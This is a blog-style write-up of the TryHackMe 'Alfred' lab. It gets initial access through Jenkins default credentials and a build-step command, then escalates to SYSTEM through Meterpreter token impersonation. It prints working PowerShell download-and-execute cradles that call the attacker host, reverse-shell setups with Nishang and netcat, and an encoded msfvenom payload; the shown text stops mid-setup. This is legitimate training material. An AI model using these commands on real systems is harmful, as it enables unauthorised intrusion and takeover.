<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>TryHackMe writeup: Alfred</title><style>
      * {
        font-family: Georgia, Cambria, "Times New Roman", Times, serif;
      }
      html, body {
        margin: 0;
        padding: 0;
      }
      h1 {
        font-size: 50px;
        margin-bottom: 17px;
        color: #333;
      }
      h2 {
        font-size: 24px;
        line-height: 1.6;
        margin: 30px 0 0 0;
        margin-bottom: 18px;
        margin-top: 33px;
        color: #333;
      }
      h3 {
        font-size: 30px;
        margin: 10px 0 20px 0;
        color: #333;
      }
      header {
        width: 640px;
        margin: auto;
      }
      section {
        width: 640px;
        margin: auto;
      }
      section p {
        margin-bottom: 27px;
        font-size: 20px;
        line-height: 1.6;
        color: #333;
      }
      section img {
        max-width: 640px;
      }
      footer {
        padding: 0 20px;
        margin: 50px 0;
        text-align: center;
        font-size: 12px;
      }
      .aspectRatioPlaceholder {
        max-width: auto !important;
        max-height: auto !important;
      }
      .aspectRatioPlaceholder-fill {
        padding-bottom: 0 !important;
      }
      header,
      section[data-field=subtitle],
      section[data-field=description] {
        display: none;
      }
      </style></head><body><article class="h-entry">
<header>
<h1 class="p-name">TryHackMe writeup: Alfred</h1>
</header>
<section data-field="subtitle" class="p-summary">
Here, I will use Jenkins as a vector to gain initial access to a target system and then use token impersonation for privilege escalation.
</section>
<section data-field="body" class="e-content">
<section name="dfac" class="section section--body section--first"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="c4b5" id="c4b5" class="graf graf--h3 graf--leading graf--title">TryHackMe writeup: Alfred</h3><p name="a350" id="a350" class="graf graf--p graf-after--h3">The <em class="markup--em markup--p-em">Alfred</em> room challenges TryHackMe users to “exploit <em class="markup--em markup--p-em">Jenkins</em> to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens” (<a href="https://tryhackme.com/room/alfred" data-href="https://tryhackme.com/room/alfred" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">“tryhackme”, 2019</a>). <a href="https://www.jenkins.io/" data-href="https://www.jenkins.io/" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">Jenkins (n.d.)</a> is a contender in the server automation space and <em class="markup--em markup--p-em">authentication tokens</em> are “an object that describes the security context of a process or thread” (<a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens" data-href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">Kennedy et al., 2021</a>). In this article, I intend to demonstrate that Jenkins can be used as a vector to gain initial access to a target system and then use token impersenation to escalate privileges.</p><figure name="6a88" id="6a88" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*_kA973FnKq9yOS1UeLdoDA.png" data-width="785" data-height="605" data-is-featured="true" src="https://cdn-images-1.medium.com/max/800/1*_kA973FnKq9yOS1UeLdoDA.png"><figcaption class="imageCaption">Base image: <a href="https://www.youtube.com/watch?v=faGib7zY1rA" data-href="https://www.youtube.com/watch?v=faGib7zY1rA" class="markup--anchor markup--figure-anchor" rel="noopener" target="_blank">Dobkins (1999)</a></figcaption></figure><h3 name="629f" id="629f" class="graf graf--h3 graf-after--figure">Procedure</h3><p name="0caf" id="0caf" class="graf graf--p graf-after--h3">The goal of this room is to:</p><ul class="postList"><li name="82f3" id="82f3" class="graf graf--li graf-after--p">Dump the user flag stored in <code class="markup--code markup--li-code">user.txt</code></li><li name="66cb" id="66cb" class="graf graf--li graf-after--li">and dump the root flag stored in <code class="markup--code markup--li-code">C:\Windows\System32\configs\root.txt</code></li></ul><p name="933a" id="933a" class="graf graf--p graf-after--li">… and of course to learn something new ;-)</p><h4 name="0e25" id="0e25" class="graf graf--h4 graf-after--p">Initial probing</h4><p name="2581" id="2581" class="graf graf--p graf-after--h4">As with these TryHackMe boot2root virtual machines, I clicked on the green coloured button on the top-right corner of the first task and then waited a few minutes for the boot2root VM to finish booting. I then ran an <code class="markup--code markup--p-code">nmap</code> scan with the following flags and parameters:</p><p name="90ea" id="90ea" class="graf graf--p graf-after--p"><code class="markup--code markup--p-code"><strong class="markup--strong markup--p-strong">$ nmap -sT -A -v [boot2root ip] -Pn -p- -O -sC -oX tcp_scan.xml</strong></code></p><p name="1f65" id="1f65" class="graf graf--p graf-after--p">This is a Windows machine, so it does not respond to <code class="markup--code markup--p-code">ping</code> requests, hence the <code class="markup--code markup--p-code">-Pn</code> flag is used to get around this issue. The nmap scan identified that the boot2root machine was most likely running <em class="markup--em markup--p-em">Windows Server 2008</em> and returned the following three (3) ports:</p><pre name="7daf" id="7daf" class="graf graf--pre graf-after--p">[... snip ...]<br>PORT      STATE SERVICE VERSION <br>80/tcp    open  http    Microsoft IIS httpd 7.5 <br>| http-methods: <br>| Supported Methods: OPTIONS TRACE GET HEAD POST<br>|_ Potentially risky methods: TRACE<br>|_http-server-header: Microsoft-IIS/7.5<br>|_http-title: Site doesn’t have a title (text/html).<br>3389/tcp  open  ssl/ms-wbt-server?<br>8080/tcp  open  http   Jetty 9.4.z-SNAPSHOT<br>|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1<br>| http-robots.txt: 1 disallowed entry <br>|_/<br>|_http-server-header: Jetty(9.4.z-SNAPSHOT)<br>|_http-title: Site doesn’t have a title (text/html;charset=utf-8).<br>[... snip ...]</pre><p name="a9b4" id="a9b4" class="graf graf--p graf-after--pre">Relevant to this job, it identified an IIS web server running on port 80 and another HTTP service with the banner <code class="markup--code markup--p-code">Jetty 9.4.z-SNAPSHOT</code>. I initially browsed to the HTTP service on port 80, and got the following (Fig. 1):</p><figure name="3f0a" id="3f0a" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*H3eweZdfPAfNvK-RDZYtIw.png" data-width="563" data-height="394" src="https://cdn-images-1.medium.com/max/800/1*H3eweZdfPAfNvK-RDZYtIw.png"><figcaption class="imageCaption"><strong class="markup--strong markup--figure-strong">Figure 1: the home page of the boot2root IIS webserver</strong></figcaption></figure><p name="936e" id="936e" class="graf graf--p graf-after--figure">My next step was to use <em class="markup--em markup--p-em">DirBuster</em> in an attempt to work out any hidden directories. I started the programme and then configured it (Fig. 2):</p><figure name="9c71" id="9c71" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*-x1u3AAzzpu7F6rSlu9zEA.png" data-width="764" data-height="539" src="https://cdn-images-1.medium.com/max/800/1*-x1u3AAzzpu7F6rSlu9zEA.png"><figcaption class="imageCaption"><strong class="markup--strong markup--figure-strong">Figure 2: DirBuster Settings</strong></figcaption></figure><p name="2bd6" id="2bd6" class="graf graf--p graf-after--figure">I put the boot2root’s IP address and port number on the “target URL” field (Fig. 2a), set what I deemed to be an appropriate wordlist in Kali Linux’s wordlists directory (Fig. 2b), configured DirBuster to “[g]o [f]aster” with two-hundred (200) threads (Fig. 2c) and then start the process (Fig. 2d).</p><p name="da1d" id="da1d" class="graf graf--p graf-after--p">After about five minutes of sub-directory bruteforcing, I came up with nothing (see Fig. 3):</p><figure name="a4b3" id="a4b3" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*NGdQc9FQcBVviR_CYwdXTw.png" data-width="765" data-height="542" src="https://cdn-images-1.medium.com/max/800/1*NGdQc9FQcBVviR_CYwdXTw.png"><figcaption class="imageCaption"><strong class="markup--strong markup--figure-strong">Figure 3: DirBuster returns no results</strong></figcaption></figure><p name="34a1" id="34a1" class="graf graf--p graf-after--figure">After this, I then had my browser go to the web service running on port 8080 of the boot2root machine, and then came across what I presume will be my way into the target system (Fig. 4):</p><figure name="1357" id="1357" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*MnU_tbC-LpsBSFzFNupivA.png" data-width="951" data-height="465" src="https://cdn-images-1.medium.com/max/800/1*MnU_tbC-LpsBSFzFNupivA.png"><figcaption class="imageCaption"><strong class="markup--strong markup--figure-strong">Figure 4: Jenkins login panel</strong></figcaption></figure><h4 name="74c9" id="74c9" class="graf graf--h4 graf-after--figure">Exploitation</h4><p name="c180" id="c180" class="graf graf--p graf-after--h4">I was initially going to setup Burp Suite (Community Edition) to do a brute force against the Jenkins login panel with various username and password combinations, but I decided to try logging in with default credentials. My first username and password combination was <code class="markup--code markup--p-code">admin:admin</code> — and I was able to log into the Jenkins panel (Fig. 5):</p><figure name="a784" id="a784" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*DxOVORuYd1F5eH5tf4b8zg.png" data-width="1264" data-height="456" src="https://cdn-images-1.medium.com/max/800/1*DxOVORuYd1F5eH5tf4b8zg.png"><figcaption class="imageCaption"><strong class="markup--strong markup--figure-strong">Figure 5: Jenkins admin panel</strong></figcaption></figure><p name="5591" id="5591" class="graf graf--p graf-after--figure">The next thing that I did after logging into Jenkins was to look for some way to exploit it to give me a command shell into the system. After some research, I discovered a method to execute shell commands on the target system (<a href="https://quick-adviser.com/how-do-i-run-a-shell-command-in-jenkins/" data-href="https://quick-adviser.com/how-do-i-run-a-shell-command-in-jenkins/" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">Davis, 2021</a>), which is described by the following five-step procedure:</p><ol class="postList"><li name="5cbb" id="5cbb" class="graf graf--li graf-after--p">Create a free style project in Jenkins.</li><li name="73e1" id="73e1" class="graf graf--li graf-after--li">Use the advanced configuration page to use custom workspace.</li><li name="a262" id="a262" class="graf graf--li graf-after--li">Add the path to your shell script.</li><li name="cc6a" id="cc6a" class="graf graf--li graf-after--li">Under the build step, select “execute shell.”</li><li name="295c" id="295c" class="graf graf--li graf-after--li">Enter the name of your shell script and click on save and execute it.</li></ol><p name="7cfa" id="7cfa" class="graf graf--p graf-after--li graf--trailing">Regarding step 1, <a href="https://www.guru99.com/create-builds-jenkins-freestyle-project.html" data-href="https://www.guru99.com/create-builds-jenkins-freestyle-project.html" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">Hamilton (2020)</a> defines a <em class="markup--em markup--p-em">free style project</em> as “a repeatable build job, script, or pipeline that contains steps and post-build actions.” I do not intend to follow these instructions “down to the letter.” Rather, I intend to just use it as a reference that I can use to complete my objective — which is to initiate a reverse shell via Metasploit’s Meterpreter.</p></div></div></section><section name="de4f" class="section section--body"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><p name="1da3" id="1da3" class="graf graf--p graf--leading graf--trailing"><strong class="markup--strong markup--p-strong">Please note that</strong> the room instructed the student to use the Nishang <code class="markup--code markup--p-code">Invoke-PowerShellTcp.ps1</code> script (<a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" data-href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">Mittal and Mehlmauer, n.d.</a>) to get an initial shell. For those interested in this method, see the appendix at the end.</p></div></div></section><section name="c437" class="section section--body section--last"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><p name="b881" id="b881" class="graf graf--p graf--leading">To listen for a reverse Meterpreter shell, I will launch Metasploit on the AttackBox via the terminal:</p><pre name="fd8d" id="fd8d" class="graf graf--pre graf-after--p"><strong class="markup--strong markup--pre-strong">$ sudo msfconsole</strong></pre><pre name="c5e2" id="c5e2" class="graf graf--pre graf-after--pre">[... snip ...]</pre><pre name="f906" id="f906" class="graf graf--pre graf-after--pre">=[ metasploit v5.0.60-dev ]<br>+ — — =[ 1947 exploits — 1089 auxiliary — 333 post ]<br>+ — — =[ 556 payloads — 45 encoders — 10 nops ]<br>+ — — =[ 7 evasion ]</pre><pre name="3afd" id="3afd" class="graf graf--pre graf-after--pre"><strong class="markup--strong markup--pre-strong">msf5 &gt;</strong></pre><p name="710c" id="710c" class="graf graf--p graf-after--pre">Then, I will use the module <code class="markup--code markup--p-code">exploit/multi/script/web_delivery</code> to serve up the Meterpreter shell, set the payload to <code class="markup--code markup--p-code">windows/meterpreter/reverse_tcp</code>, set the options and then launch the exploit:</p><pre name="5e1f" id="5e1f" class="graf graf--pre graf-after--p"><strong class="markup--strong markup--pre-strong">msf5 &gt;</strong> <strong class="markup--strong markup--pre-strong">use exploit/multi/script/web_delivery</strong><br><strong class="markup--strong markup--pre-strong">msf5 exploit(multi/script/web_delivery) &gt; set PAYLOAD windows/meterpreter/reverse_tcp</strong><br>PAYLOAD =&gt; windows/meterpreter/reverse_tcp<br><strong class="markup--strong markup--pre-strong">msf5 exploit(multi/script/web_delivery) &gt;</strong> <strong class="markup--strong markup--pre-strong">set SRVHOST &lt;attackbox ip&gt;</strong><br>SRVHOST =&gt; &lt;attackbox ip&gt;<br><strong class="markup--strong markup--pre-strong">msf5 exploit(multi/script/web_delivery) &gt;</strong> <strong class="markup--strong markup--pre-strong">set LHOST &lt;attackbox ip&gt;</strong><br>LHOST =&gt; &lt;attackbox ip&gt;<br><strong class="markup--strong markup--pre-strong">msf5 exploit(multi/script/web_delivery) &gt; set TARGET 2</strong><br>TARGET =&gt; 2<br><strong class="markup--strong markup--pre-strong">msf5 exploit(multi/script/web_delivery) &gt; exploit</strong><br>[*] Exploit running as background job 0.<br>[*] Exploit completed, but no session was created.<br><strong class="markup--strong markup--pre-strong">msf5 exploit(multi/script/web_delivery) &gt; </strong><br>[*] Started HTTPS reverse handler on https://&lt;attackbox ip&gt;:4444<br>[*] Using URL: http://&lt;attackbox ip&gt;:8080/lH2GrCFxu1<br>[*] Server started.<br>[*] Run the following command on the target machine:<br>powershell.exe -nop -w hidden -c $Z=new-object net.webclient;$Z.proxy=[Net.WebRequest]::GetSystemWebProxy();$Z.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $Z.downloadstring(&#39;http://&lt;attackbox ip&gt;:8080/lH2GrCFxu1&#39;);</pre><p name="be32" id="be32" class="graf graf--p graf-after--pre">Meterpreter gave me a PowerShell command to execute on the target machine. Turning my attention back to the Jenkins panel, I noticed that there is an existing project from the Jenkins panel (Fig. 5a), and decided to check it out.</p><figure name="e496" id="e496" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*RJEfrWMEuQrYnGveFue77A.png" data-width="731" data-height="588" src="https://cdn-images-1.medium.com/max/800/1*RJEfrWMEuQrYnGveFue77A.png"><figcaption class="imageCaption"><strong class="markup--strong markup--figure-strong">Figure 6: The project space for “Project”</strong></figcaption></figure><p name="86a7" id="86a7" class="graf graf--p graf-after--figure">To get a Meterpreter shell, I clicked on “[c]onfigure” (Fig. 6a) and scrolled down to the “[b]uild” section:</p><figure name="aca1" id="aca1" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*-EPAYgtNTysg8x7LNFwbiA.png" data-width="973" data-height="600" src="https://cdn-images-1.medium.com/max/800/1*-EPAYgtNTysg8x7LNFwbiA.png"><figcaption class="imageCaption"><strong class="markup--strong markup--figure-strong">Figure 7: The “[b]uild” section</strong></figcaption></figure><p name="b398" id="b398" class="graf graf--p graf-after--figure">On the command textbox (Fig. 7a), I replaced the <code class="markup--code markup--p-code">whoami</code> command with the following PowerShell command given by Metasploit:</p><pre name="d49b" id="d49b" class="graf graf--pre graf-after--p">powershell.exe -nop -w hidden -c $Z=new-object net.webclient;$Z.proxy=[Net.WebRequest]::GetSystemWebProxy();$Z.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $Z.downloadstring(&#39;http://&lt;attackbox ip&gt;:8080/lH2GrCFxu1&#39;);</pre><p name="56c3" id="56c3" class="graf graf--p graf-after--pre">Then, I clicked on the “Apply” button (Fig. 7b) and the “Save” button (Fig. 7c) — in that order. Finally, to get the reverse Meterpreter shell, I clicked on the “Build Now” button on the Project’s main page (Fig. 6b) and got the following on my AttackBox:</p><pre name="431f" id="431f" class="graf graf--pre graf-after--p">msf5 exploit(multi/script/web_delivery) &gt; [*] &lt;boot2root ip&gt; web_delivery — Delivering Payload (1933) bytes<br>[*] Sending stage (180291 bytes) to &lt;boot2root ip&gt;<br>[*] Meterpreter session 1 opened (&lt;attackbox ip&gt;:4444 -&gt; &lt;boot2root ip&gt;:49287) at [redacted] -0400</pre><pre name="ec3f" id="ec3f" class="graf graf--pre graf-after--pre"><strong class="markup--strong markup--pre-strong">msf5 exploit(multi/script/web_delivery) &gt;</strong></pre><p name="1ae1" id="1ae1" class="graf graf--p graf-after--pre">The next step is, naturally, to interact with the Meterpreter session:</p><pre name="d327" id="d327" class="graf graf--pre graf-after--p"><strong class="markup--strong markup--pre-strong">msf5 exploit(multi/script/web_delivery) &gt; sessions -l</strong></pre><pre name="3eb8" id="3eb8" class="graf graf--pre graf-after--pre">Active sessions<br>===============</pre><pre name="5178" id="5178" class="graf graf--pre graf-after--pre">Id Name Type Information Connection<br>-- ---- ---- ----------- ----------<br> 1 meterpreter x86/windows alfred\bruce @ ALFRED &lt;attackbox ip&gt;:4444 -&gt; &lt;boot2root ip&gt;:49287 (&lt;boot2root ip&gt;)</pre><pre name="15b5" id="15b5" class="graf graf--pre graf-after--pre"><strong class="markup--strong markup--pre-strong">msf5 exploit(multi/script/web_delivery) &gt; sessions -i 1</strong><br>[*] Starting interaction with 1…</pre><h4 name="68c8" id="68c8" class="graf graf--h4 graf-after--pre">Post-exploitation</h4><p name="6336" id="6336" class="graf graf--p graf-after--h4">I will start with dumping the <code class="markup--code markup--p-code">user.txt</code> file to get a flag:</p><pre name="9bc2" id="9bc2" class="graf graf--pre graf-after--p"><strong class="markup--strong markup--pre-strong">meterpreter &gt; search -f user.txt</strong><br>Found 1 result…<br> c:\Users\bruce\Desktop\user.txt (32 bytes)<br><strong class="markup--strong markup--pre-strong">meterpreter &gt; cat C:\\Users\\bruce\\Desktop\\user.txt</strong><br>[redacted]<strong class="markup--strong markup--pre-strong">meterpreter &gt;</strong></pre><p name="9bf9" id="9bf9" class="graf graf--p graf-after--pre">Next, I will escalate my privileges to get the <code class="markup--code markup--p-code">root.txt</code> flag. First, I dropped into a Windows command prompt shell and used the <code class="markup--code markup--p-code">whoami /priv</code> to get the privileges tokens that I have so far:</p><pre name="2862" id="2862" class="graf graf--pre graf-after--p"><strong class="markup--strong markup--pre-strong">meterpreter &gt; shell</strong><br>Process 2768 created.<br>Channel 1 created.<br>Microsoft Windows [Version 6.1.7601]<br>Copyright © 2009 Microsoft Corporation. All rights reserved.</pre><pre name="84cc" id="84cc" class="graf graf--pre graf-after--pre"><strong class="markup--strong markup--pre-strong">C:\Program Files (x86)\Jenkins\workspace\project&gt;whoami /priv</strong><br>whoami /priv</pre><p name="780d" id="780d" class="graf graf--p graf-after--pre">The following privilege tokens and their respective states were returned:</p><figure name="07e3" id="07e3" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*ygEd74ZDLvGj5OKrwM0Vpg.png" data-width="1295" data-height="998" src="https://cdn-images-1.medium.com/max/800/1*ygEd74ZDLvGj5OKrwM0Vpg.png"><figcaption class="imageCaption"><strong class="markup--strong markup--figure-strong">Figure 8: Current privilege tokens on boot2root machine</strong></figcaption></figure><p name="ece2" id="ece2" class="graf graf--p graf-after--figure">I have noticed that the <code class="markup--code markup--p-code">SeDebugPrivilege</code>, <code class="markup--code markup--p-code">SeChangeNotifyPrivilege</code>, <code class="markup--code markup--p-code">SeImpersonatePrivilege</code> and <code class="markup--code markup--p-code">SeCreateGlobalPrivilege</code> were in set to “Enabled” in status. This can be exploited with Meterpreter’s <code class="markup--code markup--p-code">incognito</code> module to engage in privilege escalation. I will start by listing the possible number of accounts to impersonate:</p><pre name="b0a3" id="b0a3" class="graf graf--pre graf-after--p"><strong class="markup--strong markup--pre-strong">meterpreter &gt; use incognito</strong><br>Loading extension incognito…Success. <br><strong class="markup--strong markup--pre-strong">meterpreter &gt; list_tokens -g </strong><br>[-] Warning: Not currently running as SYSTEM, not all tokens will be available <br> Call rev2self if primary process token is SYSTEM <br> <br>Delegation Tokens Available <br>======================================== <br>\<br>BUILTIN\Administrators</pre><pre name="bafc" id="bafc" class="graf graf--pre graf-after--pre">[... snip ...]</pre><pre name="c430" id="c430" class="graf graf--pre graf-after--pre"><strong class="markup--strong markup--pre-strong">meterpreter &gt;</strong></pre><p name="42f5" id="42f5" class="graf graf--p graf-after--pre">Then, I used <code class="markup--code markup--p-code">incognito</code>’s <code class="markup--code markup--p-code">impersonate_token</code> command to get SYSTEM privileges:</p><pre name="edab" id="edab" class="graf graf--pre graf-after--p"><strong class="markup--strong markup--pre-strong">meterpreter &gt; impersonate_token BUILTIN\\Administrators</strong><br>[-] Warning: Not currently running as SYSTEM, not all tokens will be available<br> Call rev2self if primary process token is SYSTEM<br>[+] Delegation token available<br>[+] Successfully impersonated user NT AUTHORITY\SYSTEM</pre><p name="a95b" id="a95b" class="graf graf--p graf-after--pre">This can be verified with the <code class="markup--code markup--p-code">getuid</code> command:</p><pre name="5d6b" id="5d6b" class="graf graf--pre graf-after--p"><strong class="markup--strong markup--pre-strong">meterpreter &gt; getuid</strong><br>Server username: NT AUTHORITY\SYSTEM</pre><p name="5967" id="5967" class="graf graf--p graf-after--pre">The room noted that the current process is unstable (<a href="https://tryhackme.com/room/alfred" data-href="https://tryhackme.com/room/alfred" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">“tryhackme”, 2019, task 3</a>), and recommended migrating an instance of <code class="markup--code markup--p-code">services.exe</code> for good measure:</p><pre name="cd1c" id="cd1c" class="graf graf--pre graf-after--p"><strong class="markup--strong markup--pre-strong">meterpreter &gt; ps</strong></pre><pre name="7497" id="7497" class="graf graf--pre graf-after--pre">Process List<br>============</pre><pre name="56ad" id="56ad" class="graf graf--pre graf-after--pre">PID PPID Name Arch Session User Path<br>--- ---- ---- ---- ------- ---- ----<br>[... snip ...]<br> 668 580 services.exe x64 0 NT AUTHORITY\SYSTEM C:\Windows\System32\services.exe<br>[... snip ....]</pre><pre name="a073" id="a073" class="graf graf--pre graf-after--pre"><strong class="markup--strong markup--pre-strong">meterpreter &gt; migrate 668</strong><br>[*] Migrating from 2708 to 668…<br>[*] Migration completed successfully.</pre><p name="16f0" id="16f0" class="graf graf--p graf-after--pre">Finally, I can get the <code class="markup--code markup--p-code">root.txt</code> flag:</p><pre name="5739" id="5739" class="graf graf--pre graf-after--p"><strong class="markup--strong markup--pre-strong">meterpreter &gt; cat C:\\Windows\\System32\\config\\root.txt</strong><br>��[redacted]</pre><p name="74c2" id="74c2" class="graf graf--p graf-after--pre">Thus completing all the goals and objectives of this lab.</p><h3 name="5d53" id="5d53" class="graf graf--h3 graf-after--p">Conclusion</h3><p name="3634" id="3634" class="graf graf--p graf-after--h3">This room was rather fun. I learnt about the existence Jenkins application, and got the chance to try out a new technique to deliver Meterpreter payloads that is different from using the “traditional” method of transfering a Meterpreter executable to a target system manually.</p><p name="c5f0" id="c5f0" class="graf graf--p graf-after--p">Remember, for anyone interested in getting a Meterpreter shell via the Nishang method, check out the appendix.</p><h4 name="09f5" id="09f5" class="graf graf--h4 graf-after--p">Takeaways</h4><ol class="postList"><li name="6d7d" id="6d7d" class="graf graf--li graf-after--h4">Sometimes the target application is not on main web server.</li><li name="54c6" id="54c6" class="graf graf--li graf-after--li">Always try to use default login credentials, as it can save a lot of time compared to brute forcing ;-)</li><li name="bd0f" id="bd0f" class="graf graf--li graf-after--li">Kernel exploits are not always needed. One can use the <code class="markup--code markup--li-code">incognito</code> module to escalate privileges.</li><li name="cee0" id="cee0" class="graf graf--li graf-after--li">The <code class="markup--code markup--li-code">web_delivery</code> payload delivery is a lot quicker and easier to execute than the <code class="markup--code markup--li-code">multi/handler</code> and <code class="markup--code markup--li-code">msfvenom</code> method ;-)</li></ol><h4 name="a4ca" id="a4ca" class="graf graf--h4 graf-after--li">Plug</h4><p name="cf88" id="cf88" class="graf graf--p graf-after--h4">Check out my friend Mira Lazine who, along with other associates, needs financial and emotional help. Check out the following links:</p><ul class="postList"><li name="5c45" id="5c45" class="graf graf--li graf-after--p">Her Twitter profile: <a href="https://twitter.com/MiraLazine" data-href="https://twitter.com/MiraLazine" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://twitter.com/MiraLazine</a></li><li name="0ff8" id="0ff8" class="graf graf--li graf-after--li">Her Medium profile: <a href="https://medium.com/@MiraLazine" data-href="https://medium.com/@MiraLazine" class="markup--anchor markup--li-anchor" rel="nofollow" target="_blank">https://medium.com/@MiraLazine</a></li><li name="1507" id="1507" class="graf graf--li graf-after--li">Donate to herself on Cash.App: <a href="https://cash.app/$MiraLazine" data-href="https://cash.app/$MiraLazine" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://cash.app/$MiraLazine</a></li></ul><h3 name="e1e6" id="e1e6" class="graf graf--h3 graf-after--li">Appendix: Reverse shell via Nishang</h3><p name="3cca" id="3cca" class="graf graf--p graf-after--h3">In this writeup, I used Metasploit’s <code class="markup--code markup--p-code">web_delivery</code> module to immediately get a PowerShell. However, the room recommended getting a reverse shell via Nishang’s <code class="markup--code markup--p-code">Invoke-PowerShellTcp.ps1</code> script (<a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" data-href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">Mittal and Mehlmauer, n.d.</a>). The room gives the following command to be execute on the boot2root machine:</p><pre name="35af" id="35af" class="graf graf--pre graf-after--p">powershell iex (New-Object Net.WebClient).DownloadString(&#39;http://&lt;attackbox ip&gt;:8888/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress &lt;attackbox ip&gt; -Port 4444</pre><p name="a794" id="a794" class="graf graf--p graf-after--pre"><em class="markup--em markup--p-em">*Note that </em><strong class="markup--strong markup--p-strong"><em class="markup--em markup--p-em">single quotes</em></strong><em class="markup--em markup--p-em"> should be used with the </em><code class="markup--code markup--p-code">DownloadString</code><em class="markup--em markup--p-em"> function, </em><strong class="markup--strong markup--p-strong"><em class="markup--em markup--p-em">not double quotes</em></strong>. The command will not work if single quotes are used.</p><p name="b21d" id="b21d" class="graf graf--p graf-after--p">This will instruct the boot2root computer to download the <code class="markup--code markup--p-code">Invoke-PowerShellTcp.ps1</code> script and then use its functionality to create a reverse shell to my AttackBox.</p><p name="4ebd" id="4ebd" class="graf graf--p graf-after--p">Before I get Jenkins to execute this command, I must start a Python HTTP server on my AttackBox that will serve the <code class="markup--code markup--p-code">Invoke-PowerShellTcp.ps1</code> script. I did this with the following command that is on a working directory with <code class="markup--code markup--p-code">Invoke-PowerShellTcp.ps1</code> PowerShell script:</p><pre name="51dc" id="51dc" class="graf graf--pre graf-after--p"><strong class="markup--strong markup--pre-strong">$ python3 -m http.server 8888<br></strong>Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...</pre><p name="cebb" id="cebb" class="graf graf--p graf-after--pre">I also setup a reverse <em class="markup--em markup--p-em">netcat</em> listener on my AttackBox with the following command to listen in for the PowerShell reverse shell:</p><pre name="46a7" id="46a7" class="graf graf--pre graf-after--p"><strong class="markup--strong markup--pre-strong">$ nc -l -v -n -p 4444<br></strong>listening on [any] 4444 ...</pre><p name="00e5" id="00e5" class="graf graf--p graf-after--pre">The PowerShell command can then be substituted in place of the one given by Metasploit’s <code class="markup--code markup--p-code">web_delivery</code> module when exploiting the Jenkins panel. After doing so, one should receive something like this similar shell:</p><pre name="78ba" id="78ba" class="graf graf--pre graf-after--p">listening on [any] 4444 …<br>connect to [attackbox ip] from (UNKNOWN) [boot2root ip] 49256<br>Windows PowerShell running as user bruce on ALFRED<br>Copyright © 2015 Microsoft Corporation. All rights reserved.</pre><pre name="6c09" id="6c09" class="graf graf--pre graf-after--pre"><strong class="markup--strong markup--pre-strong">PS C:\Program Files (x86)\Jenkins\workspace\project&gt;</strong></pre><p name="adc5" id="adc5" class="graf graf--p graf-after--pre">Back on the AttackBox, the room advised the student to generate an executable payload to invoke a Meterpreter reverse TCP shell:</p><pre name="c96d" id="c96d" class="graf graf--pre graf-after--p"><strong class="markup--strong markup--pre-strong">$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder        x86/shikata_ga_nai LHOST=&lt;attackbox ip&gt; LPORT=4445 -f exe -o payload.exe<br></strong>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload<br>Found 1 compatible encoders<br>Attempting to encode payload with 1 iterations of x86/shikata_ga_nai<br>x86/shikata_ga_nai succeeded with size 368 (iteration=0)<br>x86/shikata_ga_nai chosen with final size 368<br>Payload size: 368 bytes<br>Final size of exe file: 73802 bytes<br>Saved as: payload.exe</pre><p name="972a" id="972a" class="graf graf--p graf-after--pre">Then, the student is instructed to start a Meterpreter reverse TCP handler via <code class="markup--code markup--p-code">exploit/multi/handler</code></p><pre name="8a95" id="8a95" class="graf graf--pre graf-after--p"><strong class="markup--strong markup--pre-strong">$ sudo msfconsole</strong></pre><pre name="612b" id="612b" class="graf graf--pre graf-after--pre">[... snip ...]</pre><pre name="2f6b" id="2f6b" class="graf graf--pre graf-after--pre">=[ metasploit v5.0.60-dev ]<br>+ — — =[ 1947 exploits — 1089 auxiliary — 333 post ]<br>+ — — =[ 556 payloads — 45 encoders — 10 nops ]<br>+ — — =[ 7 evasion ]</pre><pre name="1cfc" id="1cfc" class="graf graf--pre graf-after--pre"><strong class="markup--strong markup--pre-strong">msf5 &gt; use exploit/multi/handler<br>msf5 exploit(multi/handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp</strong><br>PAYLOAD =&gt; windows/meterpreter/reverse_tcp<br><strong class="markup--strong markup--pre-strong">msf5 exploit(multi/handler) &gt; set LHOST &lt;attackbox ip&gt;</strong><br>LHOST =&gt; &lt;attackbox ip&gt;<br><strong class="markup--strong 